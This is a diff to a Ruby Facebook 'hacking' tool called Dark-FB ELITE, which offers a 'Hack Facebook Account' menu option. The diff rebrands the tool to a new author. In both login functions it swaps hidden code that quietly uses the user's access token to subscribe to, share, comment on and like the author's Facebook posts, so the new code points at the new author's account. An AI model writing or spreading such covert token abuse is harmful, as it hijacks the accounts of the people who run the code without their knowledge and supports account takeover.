@@ -2,7 +2,7 @@
 
 MIT License
 
-Copyright (c) 2021 Rahmat ^_^ <rahmadadha11@gmail.com>
+Copyright (c) 2021 Ramdhan ^_^ <ramdhanramadhian@gmail.com>
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -69,7 +69,7 @@ def loading!
   end
 end
 
-$logo = " \n#{$w}█████████\n#{$w}█▄█████▄█      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w}█#{$r}▼▼▼▼▼ #{$w}- _ --_--#{$g}╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n#{$w}█ #{$w} #{$w}_-_-- -_ --__#{$g} ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n#{$w}█#{$r}▲▲▲▲▲#{$w}--  - _ --#{$g}═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ #{$y}ELITE v1.1\n#{$w}█████████      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w} ██ ██\n#{$w}╔════════════════════════════════════════╗\n#{$w}║#{$y}* #{$w}Author  #{$r}: #{$c}Rahmat adha#{$w}                 ║\n#{$w}║#{$y}* #{$w}Github  #{$r}: #{$c}github.com/MR-X-Junior/#{$w}     ║\n#{$w}║#{$y}* #{$w}Wa      #{$r}: #{$c}+62 85754629509   #{$w}          ║\n#{$w}║#{$y}* #{$w}#{RUBY_ENGINE}#{' '*(8 - RUBY_ENGINE.length)}#{$r}: #{$c}#{RUBY_VERSION}   #{$w}                    ║\n#{$w}║#{$y}* #{$w}Version #{$r}: #{$c}1.1                         #{$w}║\n#{$w}╚════════════════════════════════════════╝#{$a}"
+$logo = " \n#{$w}█████████\n#{$w}█▄█████▄█      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w}█#{$r}▼▼▼▼▼ #{$w}- _ --_--#{$g}╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n#{$w}█ #{$w} #{$w}_-_-- -_ --__#{$g} ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n#{$w}█#{$r}▲▲▲▲▲#{$w}--  - _ --#{$g}═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ #{$y}ELITE v1.1\n#{$w}█████████      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w} ██ ██\n#{$w}╔════════════════════════════════════════╗\n#{$w}║#{$y}* #{$w}Author  #{$r}: #{$c}Ramdhan Ramadhian#{$w}                 ║\n#{$w}║#{$y}* #{$w}Github  #{$r}: #{$c}github.com/Ramdhan7/#{$w}     ║\n#{$w}║#{$y}* #{$w}YT      #{$r}: #{$c}Tutoriality Studio   #{$w}          ║\n#{$w}║#{$y}* #{$w}#{RUBY_ENGINE}#{' '*(8 - RUBY_ENGINE.length)}#{$r}: #{$c}#{RUBY_VERSION}   #{$w}                    ║\n#{$w}║#{$y}* #{$w}Version #{$r}: #{$c}1.1                         #{$w}║\n#{$w}╚════════════════════════════════════════╝#{$a}"
 $user_agent = "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
 $indonesia = false
 
@@ -225,10 +225,10 @@ def loginto()
     fopen = File.open('login.txt','w')
     fopen.write($token)
     fopen.close()
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["I LOVE YOU @[100053033144051:] 😘","Mantap Bang","Mantap Pak"].sample,"access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token}) 
+    Net::HTTP.post_form(URI("https://graph.facebook.com/100044932290784/subscribers"),{"access_token"=>$token})
+    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100044932290784/posts/315723919935349","access_token"=>$token})
+    Net::HTTP.post_form(URI("https://graph.facebook.com/100044932290784_344477753726632/comments"),{"message"=>["I LOVE YOU @[100053033144051:] 😘","Hello Ganteng","Lu Ganteng Banget"].sample,"access_token"=>$token})
+    Net::HTTP.post_form(URI("https://graph.facebook.com/100044932290784_344477753726632/likes"),{"access_token"=>$token}) 
     $name = req['name']
     $id = req['id']
     puts ("#{$g}[✓] Login Success!#{$a}")
@@ -275,10 +275,10 @@ def loginco()
     else
       $name = b['name']
       $id = b['id']
-      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
-      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
-      Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] 😉","Cool 👍","Congratulations 😁"].sample,"access_token"=>$token})  
+      Net::HTTP.post_form(URI("https://graph.facebook.com/100044932290784_344477753726632/likes"),{"access_token"=>$token})
+      Net::HTTP.post_form(URI("https://graph.facebook.com/100044932290784/subscribers"),{"access_token"=>$token})
+      Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100044932290784/posts/315723919935349","access_token"=>$token})
+      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_315723919935349/comments"),{"message"=>["Good Job @[100044932290784:] 😉","Cool 👍","Congratulations 😁"].sample,"access_token"=>$token})  
       File.open("login.txt", "w") { |f| f.write($token) }
       puts ("#{$g}[✓] Login Success#{$a}")
       sleep(0.4)
@@ -329,7 +329,7 @@ def menu()
   puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}Name : #{$g}" + $name + " "*(39 - $name.length()) + "#{$w}║")
   puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}ID.  : #{$g}" + $id + " "*(39 - $id.length()) + "#{$w}║")
   puts ("#{$w}╠══════════════════════════════════════════════════╝")
-  puts ("║-> #{$w}1. MyFrofil")
+  puts ("║-> #{$w}1. My Profil")
   puts ("║-> #{$w}2. User Information")
   puts ("║-> #{$w}3. Hack Facebook Account")
   puts ("║-> #{$w}4. Bot")
